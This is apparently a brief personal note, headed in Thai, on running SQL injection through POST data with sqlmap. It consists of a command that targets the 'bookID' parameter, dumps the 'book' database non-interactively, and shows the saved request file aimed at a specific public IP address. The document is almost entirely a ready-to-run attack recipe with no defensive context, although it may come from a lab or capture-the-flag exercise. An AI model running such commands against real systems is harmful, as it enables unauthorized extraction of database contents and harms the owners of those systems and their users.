# SQL Injection ด้วย SQLMap สำหรับ POST Data

sqlmap -r req.txt -p bookID -D book --dump --batch

┌──(winniethesuii㉿winniethesuii)-[~/Desktop]
└─$ cat req.txt
POST / HTTP/1.1
Host: 34.87.75.196
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Accept: */*
Connection: close

bookID=1